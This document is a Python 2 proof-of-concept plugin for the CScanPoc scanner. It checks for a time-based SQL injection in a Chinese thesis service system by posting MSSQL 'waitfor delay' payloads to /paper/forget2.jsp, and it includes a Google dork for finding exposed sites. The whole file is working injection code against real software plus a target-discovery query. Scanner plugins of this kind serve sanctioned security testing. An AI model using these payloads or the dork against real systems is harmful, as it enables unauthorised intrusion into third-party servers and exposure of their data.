# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time

class Vuln(ABVuln):
    poc_id = '1f0c6f7f-cbfe-484a-9b6c-a113f92a2073'
    name = '学位论文服务系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-11'  # 漏洞公布时间
    desc = ''' 
        杭州麦达 TRS学位论文服务系统存在SQL注入漏洞。
        google dork: intitle:"学位论文服务系统"
        /paper/forget2.jsp POST
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '学位论文服务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2bde79a0-f8e5-43cc-a410-c00efb141e86'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2010-0124453
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/paper/forget2.jsp'
            delay_0 = 'code=test%27;waitfor%20delay%20%270:0:0%27--&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5'
            delay_5 = 'code=test%27;waitfor%20delay%20%270:0:5%27--&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5'
            code, head, res, err, _ = hh.http(arg + '/papercon')  #获取cookie,不然要302
            content_type = 'Content-Type: application/x-www-form-urlencoded'
            t1 = time.time()
            code, head, res, err, _ = hh.http(url, post=delay_0, header=content_type)
            #print code, head
            if code != 200:
                return False
            t2 = time.time()
            code, head, res, err, _ = hh.http(url, post=delay_5, header=content_type)
            if code != 200:
                return False
            t3 = time.time()
            # debug("t0:" + str(t2-t1) + " t5:" + str(t3-t2))
            if(t1 + t3 - 2*t2) > 3:
                #security_hole("SQL Injection: " + url + " POST:" +delay_5)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
